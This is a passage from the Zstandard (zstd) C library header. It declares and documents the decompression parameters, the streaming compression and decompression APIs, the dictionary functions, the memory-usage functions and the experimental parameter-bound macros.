 * Parameters are sticky, and remain valid for all following frames
 * using the same DCtx context.
 * It's possible to reset parameters to default values using ZSTD_DCtx_reset().
 * Note : This API is compatible with existing ZSTD_decompressDCtx() and ZSTD_decompressStream().
 *        Therefore, no new decompression function is necessary.
 */

typedef enum {

    ZSTD_d_windowLogMax=100, /* Select a size limit (in power of 2) beyond which
                              * the streaming API will refuse to allocate memory buffer
                              * in order to protect the host from unreasonable memory requirements.
                              * This parameter is only useful in streaming mode, since no internal buffer is allocated in single-pass mode.
                              * By default, a decompression context accepts window sizes <= (1 << ZSTD_WINDOWLOG_LIMIT_DEFAULT).
                              * Special: value 0 means "use default maximum windowLog". */

    /* note : additional experimental parameters are also available
     * within the experimental section of the API.
     * At the time of this writing, they include :
     * ZSTD_d_format
     * ZSTD_d_stableOutBuffer
     * ZSTD_d_forceIgnoreChecksum
     * ZSTD_d_refMultipleDDicts
     * ZSTD_d_disableHuffmanAssembly
     * ZSTD_d_maxBlockSize
     * Because they are not stable, it's necessary to define ZSTD_STATIC_LINKING_ONLY to access them.
     * note : never ever use experimentalParam? names directly
     */
     ZSTD_d_experimentalParam1=1000,
     ZSTD_d_experimentalParam2=1001,
     ZSTD_d_experimentalParam3=1002,
     ZSTD_d_experimentalParam4=1003,
     ZSTD_d_experimentalParam5=1004,
     ZSTD_d_experimentalParam6=1005

} ZSTD_dParameter;

/*! ZSTD_dParam_getBounds() :
 *  All parameters must belong to an interval with lower and upper bounds,
 *  otherwise they will either trigger an error or be automatically clamped.
 * @return : a structure, ZSTD_bounds, which contains
 *         - an error status field, which must be tested using ZSTD_isError()
 *         - both lower and upper bounds, inclusive
 */
ZSTDLIB_API ZSTD_bounds ZSTD_dParam_getBounds(ZSTD_dParameter dParam);

/*! ZSTD_DCtx_setParameter() :
 *  Set one compression parameter, selected by enum ZSTD_dParameter.
 *  All parameters have valid bounds. Bounds can be queried using ZSTD_dParam_getBounds().
 *  Providing a value beyond bound will either clamp it, or trigger an error (depending on parameter).
 *  Setting a parameter is only possible during frame initialization (before starting decompression).
 * @return : 0, or an error code (which can be tested using ZSTD_isError()).
 */
ZSTDLIB_API size_t ZSTD_DCtx_setParameter(ZSTD_DCtx* dctx, ZSTD_dParameter param, int value);

/*! ZSTD_DCtx_reset() :
 *  Return a DCtx to clean state.
 *  Session and parameters can be reset jointly or separately.
 *  Parameters can only be reset when no active frame is being decompressed.
 * @return : 0, or an error code, which can be tested with ZSTD_isError()
 */
ZSTDLIB_API size_t ZSTD_DCtx_reset(ZSTD_DCtx* dctx, ZSTD_ResetDirective reset);


/****************************
*  Streaming
****************************/

typedef struct ZSTD_inBuffer_s {
  const void* src;    /**< start of input buffer */
  size_t size;        /**< size of input buffer */
  size_t pos;         /**< position where reading stopped. Will be updated. Necessarily 0 <= pos <= size */
} ZSTD_inBuffer;

typedef struct ZSTD_outBuffer_s {
  void*  dst;         /**< start of output buffer */
  size_t size;        /**< size of output buffer */
  size_t pos;         /**< position where writing stopped. Will be updated. Necessarily 0 <= pos <= size */
} ZSTD_outBuffer;



/*-***********************************************************************
*  Streaming compression - HowTo
*
*  A ZSTD_CStream object is required to track streaming operation.
*  Use ZSTD_createCStream() and ZSTD_freeCStream() to create/release resources.
*  ZSTD_CStream objects can be reused multiple times on consecutive compression operations.
*  It is recommended to re-use ZSTD_CStream since it will play nicer with system's memory, by re-using already allocated memory.
*
*  For parallel execution, use one separate ZSTD_CStream per thread.
*
*  note : since v1.3.0, ZSTD_CStream and ZSTD_CCtx are the same thing.
*
*  Parameters are sticky : when starting a new compression on the same context,
*  it will re-use the same sticky parameters as previous compression session.
*  When in doubt, it's recommended to fully initialize the context before usage.
*  Use ZSTD_CCtx_reset() to reset the context and ZSTD_CCtx_setParameter(),
*  ZSTD_CCtx_setPledgedSrcSize(), or ZSTD_CCtx_loadDictionary() and friends to
*  set more specific parameters, the pledged source size, or load a dictionary.
*
*  Use ZSTD_compressStream2() with ZSTD_e_continue as many times as necessary to
*  consume input stream. The function will automatically update both `pos`
*  fields within `input` and `output`.
*  Note that the function may not consume the entire input, for example, because
*  the output buffer is already full, in which case `input.pos < input.size`.
*  The caller must check if input has been entirely consumed.
*  If not, the caller must make some room to receive more compressed data,
*  and then present again remaining input data.
*  note: ZSTD_e_continue is guaranteed to make some forward progress when called,
*        but doesn't guarantee maximal forward progress. This is especially relevant
*        when compressing with multiple threads. The call won't block if it can
*        consume some input, but if it can't it will wait for some, but not all,
*        output to be flushed.
* @return : provides a minimum amount of data remaining to be flushed from internal buffers
*           or an error code, which can be tested using ZSTD_isError().
*
*  At any moment, it's possible to flush whatever data might remain stuck within internal buffer,
*  using ZSTD_compressStream2() with ZSTD_e_flush. `output->pos` will be updated.
*  Note that, if `output->size` is too small, a single invocation with ZSTD_e_flush might not be enough (return code > 0).
*  In which case, make some room to receive more compressed data, and call again ZSTD_compressStream2() with ZSTD_e_flush.
*  You must continue calling ZSTD_compressStream2() with ZSTD_e_flush until it returns 0, at which point you can change the
*  operation.
*  note: ZSTD_e_flush will flush as much output as possible, meaning when compressing with multiple threads, it will
*        block until the flush is complete or the output buffer is full.
*  @return : 0 if internal buffers are entirely flushed,
*            >0 if some data still present within internal buffer (the value is minimal estimation of remaining size),
*            or an error code, which can be tested using ZSTD_isError().
*
*  Calling ZSTD_compressStream2() with ZSTD_e_end instructs to finish a frame.
*  It will perform a flush and write frame epilogue.
*  The epilogue is required for decoders to consider a frame completed.
*  flush operation is the same, and follows same rules as calling ZSTD_compressStream2() with ZSTD_e_flush.
*  You must continue calling ZSTD_compressStream2() with ZSTD_e_end until it returns 0, at which point you are free to
*  start a new frame.
*  note: ZSTD_e_end will flush as much output as possible, meaning when compressing with multiple threads, it will
*        block until the flush is complete or the output buffer is full.
*  @return : 0 if frame fully completed and fully flushed,
*            >0 if some data still present within internal buffer (the value is minimal estimation of remaining size),
*            or an error code, which can be tested using ZSTD_isError().
*
* *******************************************************************/

typedef ZSTD_CCtx ZSTD_CStream;  /**< CCtx and CStream are now effectively same object (>= v1.3.0) */
                                 /* Continue to distinguish them for compatibility with older versions <= v1.2.0 */
/*===== ZSTD_CStream management functions =====*/
ZSTDLIB_API ZSTD_CStream* ZSTD_createCStream(void);
ZSTDLIB_API size_t ZSTD_freeCStream(ZSTD_CStream* zcs);  /* accept NULL pointer */

/*===== Streaming compression functions =====*/
typedef enum {
    ZSTD_e_continue=0, /* collect more data, encoder decides when to output compressed result, for optimal compression ratio */
    ZSTD_e_flush=1,    /* flush any data provided so far,
                        * it creates (at least) one new block, that can be decoded immediately on reception;
                        * frame will continue: any future data can still reference previously compressed data, improving compression.
                        * note : multithreaded compression will block to flush as much output as possible. */
    ZSTD_e_end=2       /* flush any remaining data _and_ close current frame.
                        * note that frame is only closed after compressed data is fully flushed (return value == 0).
                        * After that point, any additional data starts a new frame.
                        * note : each frame is independent (does not reference any content from previous frame).
                        : note : multithreaded compression will block to flush as much output as possible. */
} ZSTD_EndDirective;

/*! ZSTD_compressStream2() : Requires v1.4.0+
 *  Behaves about the same as ZSTD_compressStream, with additional control on end directive.
 *  - Compression parameters are pushed into CCtx before starting compression, using ZSTD_CCtx_set*()
 *  - Compression parameters cannot be changed once compression is started (save a list of exceptions in multi-threading mode)
 *  - output->pos must be <= dstCapacity, input->pos must be <= srcSize
 *  - output->pos and input->pos will be updated. They are guaranteed to remain below their respective limit.
 *  - endOp must be a valid directive
 *  - When nbWorkers==0 (default), function is blocking : it completes its job before returning to caller.
 *  - When nbWorkers>=1, function is non-blocking : it copies a portion of input, distributes jobs to internal worker threads, flush to output whatever is available,
 *                                                  and then immediately returns, just indicating that there is some data remaining to be flushed.
 *                                                  The function nonetheless guarantees forward progress : it will return only after it reads or write at least 1+ byte.
 *  - Exception : if the first call requests a ZSTD_e_end directive and provides enough dstCapacity, the function delegates to ZSTD_compress2() which is always blocking.
 *  - @return provides a minimum amount of data remaining to be flushed from internal buffers
 *            or an error code, which can be tested using ZSTD_isError().
 *            if @return != 0, flush is not fully completed, there is still some data left within internal buffers.
 *            This is useful for ZSTD_e_flush, since in this case more flushes are necessary to empty all buffers.
 *            For ZSTD_e_end, @return == 0 when internal buffers are fully flushed and frame is completed.
 *  - after a ZSTD_e_end directive, if internal buffer is not fully flushed (@return != 0),
 *            only ZSTD_e_end or ZSTD_e_flush operations are allowed.
 *            Before starting a new compression job, or changing compression parameters,
 *            it is required to fully flush internal buffers.
 */
ZSTDLIB_API size_t ZSTD_compressStream2( ZSTD_CCtx* cctx,
                                         ZSTD_outBuffer* output,
                                         ZSTD_inBuffer* input,
                                         ZSTD_EndDirective endOp);


/* These buffer sizes are softly recommended.
 * They are not required : ZSTD_compressStream*() happily accepts any buffer size, for both input and output.
 * Respecting the recommended size just makes it a bit easier for ZSTD_compressStream*(),
 * reducing the amount of memory shuffling and buffering, resulting in minor performance savings.
 *
 * However, note that these recommendations are from the perspective of a C caller program.
 * If the streaming interface is invoked from some other language,
 * especially managed ones such as Java or Go, through a foreign function interface such as jni or cgo,
 * a major performance rule is to reduce crossing such interface to an absolute minimum.
 * It's not rare that performance ends being spent more into the interface, rather than compression itself.
 * In which cases, prefer using large buffers, as large as practical,
 * for both input and output, to reduce the nb of roundtrips.
 */
ZSTDLIB_API size_t ZSTD_CStreamInSize(void);    /**< recommended size for input buffer */
ZSTDLIB_API size_t ZSTD_CStreamOutSize(void);   /**< recommended size for output buffer. Guarantee to successfully flush at least one complete compressed block. */


/* *****************************************************************************
 * This following is a legacy streaming API, available since v1.0+ .
 * It can be replaced by ZSTD_CCtx_reset() and ZSTD_compressStream2().
 * It is redundant, but remains fully supported.
 ******************************************************************************/

/*!
 * Equivalent to:
 *
 *     ZSTD_CCtx_reset(zcs, ZSTD_reset_session_only);
 *     ZSTD_CCtx_refCDict(zcs, NULL); // clear the dictionary (if any)
 *     ZSTD_CCtx_setParameter(zcs, ZSTD_c_compressionLevel, compressionLevel);
 *
 * Note that ZSTD_initCStream() clears any previously set dictionary. Use the new API
 * to compress with a dictionary.
 */
ZSTDLIB_API size_t ZSTD_initCStream(ZSTD_CStream* zcs, int compressionLevel);
/*!
 * Alternative for ZSTD_compressStream2(zcs, output, input, ZSTD_e_continue).
 * NOTE: The return value is different. ZSTD_compressStream() returns a hint for
 * the next read size (if non-zero and not an error). ZSTD_compressStream2()
 * returns the minimum nb of bytes left to flush (if non-zero and not an error).
 */
ZSTDLIB_API size_t ZSTD_compressStream(ZSTD_CStream* zcs, ZSTD_outBuffer* output, ZSTD_inBuffer* input);
/*! Equivalent to ZSTD_compressStream2(zcs, output, &emptyInput, ZSTD_e_flush). */
ZSTDLIB_API size_t ZSTD_flushStream(ZSTD_CStream* zcs, ZSTD_outBuffer* output);
/*! Equivalent to ZSTD_compressStream2(zcs, output, &emptyInput, ZSTD_e_end). */
ZSTDLIB_API size_t ZSTD_endStream(ZSTD_CStream* zcs, ZSTD_outBuffer* output);


/*-***************************************************************************
*  Streaming decompression - HowTo
*
*  A ZSTD_DStream object is required to track streaming operations.
*  Use ZSTD_createDStream() and ZSTD_freeDStream() to create/release resources.
*  ZSTD_DStream objects can be re-used multiple times.
*
*  Use ZSTD_initDStream() to start a new decompression operation.
* @return : recommended first input size
*  Alternatively, use advanced API to set specific properties.
*
*  Use ZSTD_decompressStream() repetitively to consume your input.
*  The function will update both `pos` fields.
*  If `input.pos < input.size`, some input has not been consumed.
*  It's up to the caller to present again remaining data.
*  The function tries to flush all data decoded immediately, respecting output buffer size.
*  If `output.pos < output.size`, decoder has flushed everything it could.
*  But if `output.pos == output.size`, there might be some data left within internal buffers.,
*  In which case, call ZSTD_decompressStream() again to flush whatever remains in the buffer.
*  Note : with no additional input provided, amount of data flushed is necessarily <= ZSTD_BLOCKSIZE_MAX.
* @return : 0 when a frame is completely decoded and fully flushed,
*        or an error code, which can be tested using ZSTD_isError(),
*        or any other value > 0, which means there is still some decoding or flushing to do to complete current frame :
*                                the return value is a suggested next input size (just a hint for better latency)
*                                that will never request more than the remaining frame size.
* *******************************************************************************/

typedef ZSTD_DCtx ZSTD_DStream;  /**< DCtx and DStream are now effectively same object (>= v1.3.0) */
                                 /* For compatibility with versions <= v1.2.0, prefer differentiating them. */
/*===== ZSTD_DStream management functions =====*/
ZSTDLIB_API ZSTD_DStream* ZSTD_createDStream(void);
ZSTDLIB_API size_t ZSTD_freeDStream(ZSTD_DStream* zds);  /* accept NULL pointer */

/*===== Streaming decompression functions =====*/

/*! ZSTD_initDStream() :
 * Initialize/reset DStream state for new decompression operation.
 * Call before new decompression operation using same DStream.
 *
 * Note : This function is redundant with the advanced API and equivalent to:
 *     ZSTD_DCtx_reset(zds, ZSTD_reset_session_only);
 *     ZSTD_DCtx_refDDict(zds, NULL);
 */
ZSTDLIB_API size_t ZSTD_initDStream(ZSTD_DStream* zds);

/*! ZSTD_decompressStream() :
 * Streaming decompression function.
 * Call repetitively to consume full input updating it as necessary.
 * Function will update both input and output `pos` fields exposing current state via these fields:
 * - `input.pos < input.size`, some input remaining and caller should provide remaining input
 *   on the next call.
 * - `output.pos < output.size`, decoder finished and flushed all remaining buffers.
 * - `output.pos == output.size`, potentially uncflushed data present in the internal buffers,
 *   call ZSTD_decompressStream() again to flush remaining data to output.
 * Note : with no additional input, amount of data flushed <= ZSTD_BLOCKSIZE_MAX.
 *
 * @return : 0 when a frame is completely decoded and fully flushed,
 *           or an error code, which can be tested using ZSTD_isError(),
 *           or any other value > 0, which means there is some decoding or flushing to do to complete current frame.
 */
ZSTDLIB_API size_t ZSTD_decompressStream(ZSTD_DStream* zds, ZSTD_outBuffer* output, ZSTD_inBuffer* input);

ZSTDLIB_API size_t ZSTD_DStreamInSize(void);    /*!< recommended size for input buffer */
ZSTDLIB_API size_t ZSTD_DStreamOutSize(void);   /*!< recommended size for output buffer. Guarantee to successfully flush at least one complete block in all circumstances. */


/**************************
*  Simple dictionary API
***************************/
/*! ZSTD_compress_usingDict() :
 *  Compression at an explicit compression level using a Dictionary.
 *  A dictionary can be any arbitrary data segment (also called a prefix),
 *  or a buffer with specified information (see zdict.h).
 *  Note : This function loads the dictionary, resulting in significant startup delay.
 *         It's intended for a dictionary used only once.
 *  Note 2 : When `dict == NULL || dictSize < 8` no dictionary is used. */
ZSTDLIB_API size_t ZSTD_compress_usingDict(ZSTD_CCtx* ctx,
                                           void* dst, size_t dstCapacity,
                                     const void* src, size_t srcSize,
                                     const void* dict,size_t dictSize,
                                           int compressionLevel);

/*! ZSTD_decompress_usingDict() :
 *  Decompression using a known Dictionary.
 *  Dictionary must be identical to the one used during compression.
 *  Note : This function loads the dictionary, resulting in significant startup delay.
 *         It's intended for a dictionary used only once.
 *  Note : When `dict == NULL || dictSize < 8` no dictionary is used. */
ZSTDLIB_API size_t ZSTD_decompress_usingDict(ZSTD_DCtx* dctx,
                                             void* dst, size_t dstCapacity,
                                       const void* src, size_t srcSize,
                                       const void* dict,size_t dictSize);


/***********************************
 *  Bulk processing dictionary API
 **********************************/
typedef struct ZSTD_CDict_s ZSTD_CDict;

/*! ZSTD_createCDict() :
 *  When compressing multiple messages or blocks using the same dictionary,
 *  it's recommended to digest the dictionary only once, since it's a costly operation.
 *  ZSTD_createCDict() will create a state from digesting a dictionary.
 *  The resulting state can be used for future compression operations with very limited startup cost.
 *  ZSTD_CDict can be created once and shared by multiple threads concurrently, since its usage is read-only.
 * @dictBuffer can be released after ZSTD_CDict creation, because its content is copied within CDict.
 *  Note 1 : Consider experimental function `ZSTD_createCDict_byReference()` if you prefer to not duplicate @dictBuffer content.
 *  Note 2 : A ZSTD_CDict can be created from an empty @dictBuffer,
 *      in which case the only thing that it transports is the @compressionLevel.
 *      This can be useful in a pipeline featuring ZSTD_compress_usingCDict() exclusively,
 *      expecting a ZSTD_CDict parameter with any data, including those without a known dictionary. */
ZSTDLIB_API ZSTD_CDict* ZSTD_createCDict(const void* dictBuffer, size_t dictSize,
                                         int compressionLevel);

/*! ZSTD_freeCDict() :
 *  Function frees memory allocated by ZSTD_createCDict().
 *  If a NULL pointer is passed, no operation is performed. */
ZSTDLIB_API size_t      ZSTD_freeCDict(ZSTD_CDict* CDict);

/*! ZSTD_compress_usingCDict() :
 *  Compression using a digested Dictionary.
 *  Recommended when same dictionary is used multiple times.
 *  Note : compression level is _decided at dictionary creation time_,
 *     and frame parameters are hardcoded (dictID=yes, contentSize=yes, checksum=no) */
ZSTDLIB_API size_t ZSTD_compress_usingCDict(ZSTD_CCtx* cctx,
                                            void* dst, size_t dstCapacity,
                                      const void* src, size_t srcSize,
                                      const ZSTD_CDict* cdict);


typedef struct ZSTD_DDict_s ZSTD_DDict;

/*! ZSTD_createDDict() :
 *  Create a digested dictionary, ready to start decompression operation without startup delay.
 *  dictBuffer can be released after DDict creation, as its content is copied inside DDict. */
ZSTDLIB_API ZSTD_DDict* ZSTD_createDDict(const void* dictBuffer, size_t dictSize);

/*! ZSTD_freeDDict() :
 *  Function frees memory allocated with ZSTD_createDDict()
 *  If a NULL pointer is passed, no operation is performed. */
ZSTDLIB_API size_t      ZSTD_freeDDict(ZSTD_DDict* ddict);

/*! ZSTD_decompress_usingDDict() :
 *  Decompression using a digested Dictionary.
 *  Recommended when same dictionary is used multiple times. */
ZSTDLIB_API size_t ZSTD_decompress_usingDDict(ZSTD_DCtx* dctx,
                                              void* dst, size_t dstCapacity,
                                        const void* src, size_t srcSize,
                                        const ZSTD_DDict* ddict);


/********************************
 *  Dictionary helper functions
 *******************************/

/*! ZSTD_getDictID_fromDict() : Requires v1.4.0+
 *  Provides the dictID stored within dictionary.
 *  if @return == 0, the dictionary is not conformant with Zstandard specification.
 *  It can still be loaded, but as a content-only dictionary. */
ZSTDLIB_API unsigned ZSTD_getDictID_fromDict(const void* dict, size_t dictSize);

/*! ZSTD_getDictID_fromCDict() : Requires v1.5.0+
 *  Provides the dictID of the dictionary loaded into `cdict`.
 *  If @return == 0, the dictionary is not conformant to Zstandard specification, or empty.
 *  Non-conformant dictionaries can still be loaded, but as content-only dictionaries. */
ZSTDLIB_API unsigned ZSTD_getDictID_fromCDict(const ZSTD_CDict* cdict);

/*! ZSTD_getDictID_fromDDict() : Requires v1.4.0+
 *  Provides the dictID of the dictionary loaded into `ddict`.
 *  If @return == 0, the dictionary is not conformant to Zstandard specification, or empty.
 *  Non-conformant dictionaries can still be loaded, but as content-only dictionaries. */
ZSTDLIB_API unsigned ZSTD_getDictID_fromDDict(const ZSTD_DDict* ddict);

/*! ZSTD_getDictID_fromFrame() : Requires v1.4.0+
 *  Provides the dictID required to decompressed the frame stored within `src`.
 *  If @return == 0, the dictID could not be decoded.
 *  This could for one of the following reasons :
 *  - The frame does not require a dictionary to be decoded (most common case).
 *  - The frame was built with dictID intentionally removed. Whatever dictionary is necessary is a hidden piece of information.
 *    Note : this use case also happens when using a non-conformant dictionary.
 *  - `srcSize` is too small, and as a result, the frame header could not be decoded (only possible if `srcSize < ZSTD_FRAMEHEADERSIZE_MAX`).
 *  - This is not a Zstandard frame.
 *  When identifying the exact failure cause, it's possible to use ZSTD_getFrameHeader(), which will provide a more precise error code. */
ZSTDLIB_API unsigned ZSTD_getDictID_fromFrame(const void* src, size_t srcSize);


/*******************************************************************************
 * Advanced dictionary and prefix API (Requires v1.4.0+)
 *
 * This API allows dictionaries to be used with ZSTD_compress2(),
 * ZSTD_compressStream2(), and ZSTD_decompressDCtx().
 * Dictionaries are sticky, they remain valid when same context is re-used,
 * they only reset when the context is reset
 * with ZSTD_reset_parameters or ZSTD_reset_session_and_parameters.
 * In contrast, Prefixes are single-use.
 ******************************************************************************/


/*! ZSTD_CCtx_loadDictionary() : Requires v1.4.0+
 *  Create an internal CDict from `dict` buffer.
 *  Decompression will have to use same dictionary.
 * @result : 0, or an error code (which can be tested with ZSTD_isError()).
 *  Special: Loading a NULL (or 0-size) dictionary invalidates previous dictionary,
 *           meaning "return to no-dictionary mode".
 *  Note 1 : Dictionary is sticky, it will be used for all future compressed frames,
 *           until parameters are reset, a new dictionary is loaded, or the dictionary
 *           is explicitly invalidated by loading a NULL dictionary.
 *  Note 2 : Loading a dictionary involves building tables.
 *           It's also a CPU consuming operation, with non-negligible impact on latency.
 *           Tables are dependent on compression parameters, and for this reason,
 *           compression parameters can no longer be changed after loading a dictionary.
 *  Note 3 :`dict` content will be copied internally.
 *           Use experimental ZSTD_CCtx_loadDictionary_byReference() to reference content instead.
 *           In such a case, dictionary buffer must outlive its users.
 *  Note 4 : Use ZSTD_CCtx_loadDictionary_advanced()
 *           to precisely select how dictionary content must be interpreted.
 *  Note 5 : This method does not benefit from LDM (long distance mode).
 *           If you want to employ LDM on some large dictionary content,
 *           prefer employing ZSTD_CCtx_refPrefix() described below.
 */
ZSTDLIB_API size_t ZSTD_CCtx_loadDictionary(ZSTD_CCtx* cctx, const void* dict, size_t dictSize);

/*! ZSTD_CCtx_refCDict() : Requires v1.4.0+
 *  Reference a prepared dictionary, to be used for all future compressed frames.
 *  Note that compression parameters are enforced from within CDict,
 *  and supersede any compression parameter previously set within CCtx.
 *  The parameters ignored are labelled as "superseded-by-cdict" in the ZSTD_cParameter enum docs.
 *  The ignored parameters will be used again if the CCtx is returned to no-dictionary mode.
 *  The dictionary will remain valid for future compressed frames using same CCtx.
 * @result : 0, or an error code (which can be tested with ZSTD_isError()).
 *  Special : Referencing a NULL CDict means "return to no-dictionary mode".
 *  Note 1 : Currently, only one dictionary can be managed.
 *           Referencing a new dictionary effectively "discards" any previous one.
 *  Note 2 : CDict is just referenced, its lifetime must outlive its usage within CCtx. */
ZSTDLIB_API size_t ZSTD_CCtx_refCDict(ZSTD_CCtx* cctx, const ZSTD_CDict* cdict);

/*! ZSTD_CCtx_refPrefix() : Requires v1.4.0+
 *  Reference a prefix (single-usage dictionary) for next compressed frame.
 *  A prefix is **only used once**. Tables are discarded at end of frame (ZSTD_e_end).
 *  Decompression will need same prefix to properly regenerate data.
 *  Compressing with a prefix is similar in outcome as performing a diff and compressing it,
 *  but performs much faster, especially during decompression (compression speed is tunable with compression level).
 *  This method is compatible with LDM (long distance mode).
 * @result : 0, or an error code (which can be tested with ZSTD_isError()).
 *  Special: Adding any prefix (including NULL) invalidates any previous prefix or dictionary
 *  Note 1 : Prefix buffer is referenced. It **must** outlive compression.
 *           Its content must remain unmodified during compression.
 *  Note 2 : If the intention is to diff some large src data blob with some prior version of itself,
 *           ensure that the window size is large enough to contain the entire source.
 *           See ZSTD_c_windowLog.
 *  Note 3 : Referencing a prefix involves building tables, which are dependent on compression parameters.
 *           It's a CPU consuming operation, with non-negligible impact on latency.
 *           If there is a need to use the same prefix multiple times, consider loadDictionary instead.
 *  Note 4 : By default, the prefix is interpreted as raw content (ZSTD_dct_rawContent).
 *           Use experimental ZSTD_CCtx_refPrefix_advanced() to alter dictionary interpretation. */
ZSTDLIB_API size_t ZSTD_CCtx_refPrefix(ZSTD_CCtx* cctx,
                                 const void* prefix, size_t prefixSize);

/*! ZSTD_DCtx_loadDictionary() : Requires v1.4.0+
 *  Create an internal DDict from dict buffer, to be used to decompress all future frames.
 *  The dictionary remains valid for all future frames, until explicitly invalidated, or
 *  a new dictionary is loaded.
 * @result : 0, or an error code (which can be tested with ZSTD_isError()).
 *  Special : Adding a NULL (or 0-size) dictionary invalidates any previous dictionary,
 *            meaning "return to no-dictionary mode".
 *  Note 1 : Loading a dictionary involves building tables,
 *           which has a non-negligible impact on CPU usage and latency.
 *           It's recommended to "load once, use many times", to amortize the cost
 *  Note 2 :`dict` content will be copied internally, so `dict` can be released after loading.
 *           Use ZSTD_DCtx_loadDictionary_byReference() to reference dictionary content instead.
 *  Note 3 : Use ZSTD_DCtx_loadDictionary_advanced() to take control of
 *           how dictionary content is loaded and interpreted.
 */
ZSTDLIB_API size_t ZSTD_DCtx_loadDictionary(ZSTD_DCtx* dctx, const void* dict, size_t dictSize);

/*! ZSTD_DCtx_refDDict() : Requires v1.4.0+
 *  Reference a prepared dictionary, to be used to decompress next frames.
 *  The dictionary remains active for decompression of future frames using same DCtx.
 *
 *  If called with ZSTD_d_refMultipleDDicts enabled, repeated calls of this function
 *  will store the DDict references in a table, and the DDict used for decompression
 *  will be determined at decompression time, as per the dict ID in the frame.
 *  The memory for the table is allocated on the first call to refDDict, and can be
 *  freed with ZSTD_freeDCtx().
 *
 *  If called with ZSTD_d_refMultipleDDicts disabled (the default), only one dictionary
 *  will be managed, and referencing a dictionary effectively "discards" any previous one.
 *
 * @result : 0, or an error code (which can be tested with ZSTD_isError()).
 *  Special: referencing a NULL DDict means "return to no-dictionary mode".
 *  Note 2 : DDict is just referenced, its lifetime must outlive its usage from DCtx.
 */
ZSTDLIB_API size_t ZSTD_DCtx_refDDict(ZSTD_DCtx* dctx, const ZSTD_DDict* ddict);

/*! ZSTD_DCtx_refPrefix() : Requires v1.4.0+
 *  Reference a prefix (single-usage dictionary) to decompress next frame.
 *  This is the reverse operation of ZSTD_CCtx_refPrefix(),
 *  and must use the same prefix as the one used during compression.
 *  Prefix is **only used once**. Reference is discarded at end of frame.
 *  End of frame is reached when ZSTD_decompressStream() returns 0.
 * @result : 0, or an error code (which can be tested with ZSTD_isError()).
 *  Note 1 : Adding any prefix (including NULL) invalidates any previously set prefix or dictionary
 *  Note 2 : Prefix buffer is referenced. It **must** outlive decompression.
 *           Prefix buffer must remain unmodified up to the end of frame,
 *           reached when ZSTD_decompressStream() returns 0.
 *  Note 3 : By default, the prefix is treated as raw content (ZSTD_dct_rawContent).
 *           Use ZSTD_CCtx_refPrefix_advanced() to alter dictMode (Experimental section)
 *  Note 4 : Referencing a raw content prefix has almost no cpu nor memory cost.
 *           A full dictionary is more costly, as it requires building tables.
 */
ZSTDLIB_API size_t ZSTD_DCtx_refPrefix(ZSTD_DCtx* dctx,
                                 const void* prefix, size_t prefixSize);

/* ===   Memory management   === */

/*! ZSTD_sizeof_*() : Requires v1.4.0+
 *  These functions give the _current_ memory usage of selected object.
 *  Note that object memory usage can evolve (increase or decrease) over time. */
ZSTDLIB_API size_t ZSTD_sizeof_CCtx(const ZSTD_CCtx* cctx);
ZSTDLIB_API size_t ZSTD_sizeof_DCtx(const ZSTD_DCtx* dctx);
ZSTDLIB_API size_t ZSTD_sizeof_CStream(const ZSTD_CStream* zcs);
ZSTDLIB_API size_t ZSTD_sizeof_DStream(const ZSTD_DStream* zds);
ZSTDLIB_API size_t ZSTD_sizeof_CDict(const ZSTD_CDict* cdict);
ZSTDLIB_API size_t ZSTD_sizeof_DDict(const ZSTD_DDict* ddict);

#endif  /* ZSTD_H_235446 */


/* **************************************************************************************
 *   ADVANCED AND EXPERIMENTAL FUNCTIONS
 ****************************************************************************************
 * The definitions in the following section are considered experimental.
 * They are provided for advanced scenarios.
 * They should never be used with a dynamic library, as prototypes may change in the future.
 * Use them only in association with static linking.
 * ***************************************************************************************/

#if defined(ZSTD_STATIC_LINKING_ONLY) && !defined(ZSTD_H_ZSTD_STATIC_LINKING_ONLY)
#define ZSTD_H_ZSTD_STATIC_LINKING_ONLY

/* This can be overridden externally to hide static symbols. */
#ifndef ZSTDLIB_STATIC_API
#  if defined(ZSTD_DLL_EXPORT) && (ZSTD_DLL_EXPORT==1)
#    define ZSTDLIB_STATIC_API __declspec(dllexport) ZSTDLIB_VISIBLE
#  elif defined(ZSTD_DLL_IMPORT) && (ZSTD_DLL_IMPORT==1)
#    define ZSTDLIB_STATIC_API __declspec(dllimport) ZSTDLIB_VISIBLE
#  else
#    define ZSTDLIB_STATIC_API ZSTDLIB_VISIBLE
#  endif
#endif

/****************************************************************************************
 *   experimental API (static linking only)
 ****************************************************************************************
 * The following symbols and constants
 * are not planned to join "stable API" status in the near future.
 * They can still change in future versions.
 * Some of them are planned to remain in the static_only section indefinitely.
 * Some of them might be removed in the future (especially when redundant with existing stable functions)
 * ***************************************************************************************/

#define ZSTD_FRAMEHEADERSIZE_PREFIX(format) ((format) == ZSTD_f_zstd1 ? 5 : 1)   /* minimum input size required to query frame header size */
#define ZSTD_FRAMEHEADERSIZE_MIN(format)    ((format) == ZSTD_f_zstd1 ? 6 : 2)
#define ZSTD_FRAMEHEADERSIZE_MAX   18   /* can be useful for static allocation */
#define ZSTD_SKIPPABLEHEADERSIZE    8

/* compression parameter bounds */
#define ZSTD_WINDOWLOG_MAX_32    30
#define ZSTD_WINDOWLOG_MAX_64    31
#define ZSTD_WINDOWLOG_MAX     ((int)(sizeof(size_t) == 4 ? ZSTD_WINDOWLOG_MAX_32 : ZSTD_WINDOWLOG_MAX_64))
#define ZSTD_WINDOWLOG_MIN       10
#define ZSTD_HASHLOG_MAX       ((ZSTD_WINDOWLOG_MAX < 30) ? ZSTD_WINDOWLOG_MAX : 30)
#define ZSTD_HASHLOG_MIN          6
#define ZSTD_CHAINLOG_MAX_32     29
#define ZSTD_CHAINLOG_MAX_64     30
#define ZSTD_CHAINLOG_MAX      ((int)(sizeof(size_t) == 4 ? ZSTD_CHAINLOG_MAX_32 : ZSTD_CHAINLOG_MAX_64))
#define ZSTD_CHAINLOG_MIN        ZSTD_HASHLOG_MIN
#define ZSTD_SEARCHLOG_MAX      (ZSTD_WINDOWLOG_MAX-1)
#define ZSTD_SEARCHLOG_MIN        1
#define ZSTD_MINMATCH_MAX         7   /* only for ZSTD_fast, other strategies are limited to 6 */
#define ZSTD_MINMATCH_MIN         3   /* only for ZSTD_btopt+, faster strategies are limited to 4 */
#define ZSTD_TARGETLENGTH_MAX    ZSTD_BLOCKSIZE_MAX
#define ZSTD_TARGETLENGTH_MIN     0   /* note : comparing this constant to an unsigned results in a tautological test */
#define ZSTD_STRATEGY_MIN        ZSTD_fast
#define ZSTD_STRATEGY_MAX        ZSTD_btultra2
